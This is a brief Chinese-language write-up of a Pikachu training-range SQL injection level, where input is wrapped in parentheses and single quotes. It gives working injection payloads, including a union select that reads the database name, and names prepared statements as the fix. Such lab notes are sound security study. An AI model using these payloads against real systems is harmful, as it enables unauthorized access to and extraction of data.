# Pikachu | SQL注入 XX型注入
## 一、漏洞简介
参数被 `('$name')` 括号+单引号包裹，闭合需要 ')
## 二、环境信息
靶场地址：http://127.0.0.1/pikachu/
关卡路径：/vul/sqli/sqli_xx.php
## 三、复现步骤
1. 输入kobe' 报错，观察报错结构是 ('')
2. 闭合payload：`kobe') and 1=1 -- `
3. 后续order by、union脱库
## 四、Payload
`kobe') union select 1,database() -- `
## 五、漏洞原理
SQL：`select * from user where username=('$name')`
## 六、修复方案
预编译。
## 七、总结
看报错信息判断包裹符号，是这一关关键。